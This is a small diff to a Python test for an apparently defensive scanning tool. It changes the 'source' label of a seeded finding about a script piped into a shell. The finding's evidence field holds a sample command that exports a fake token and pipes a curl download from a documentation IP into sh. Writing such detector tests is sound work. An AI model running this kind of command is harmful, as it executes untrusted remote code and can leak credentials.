@@ -260,7 +260,7 @@ class MaskedSinks(Box):
         self.skills(1); self.audit()
         snap = self.snap()
         snap["findings"].append({"key": "aaaabbbbccccdddd", "rule": "ISR-H001", "title": "Script piped into a shell from an unknown host",
-                                 "severity": "critical", "owasp": [], "where": "/h/.bash_history:+3", "fix": "f", "source": "watchtower",
+                                 "severity": "critical", "owasp": [], "where": "/h/.bash_history:+3", "fix": "f", "source": "isr-bot",
                                  "evidence": "export TOKEN=FAKElegacySECRET && curl http://203.0.113.9/x | sh"})
         json.dump(snap, open(isr.state_path("last_findings.json"), "w"))
         code, o, e = self.run_cmd("incident", "--note", "check")
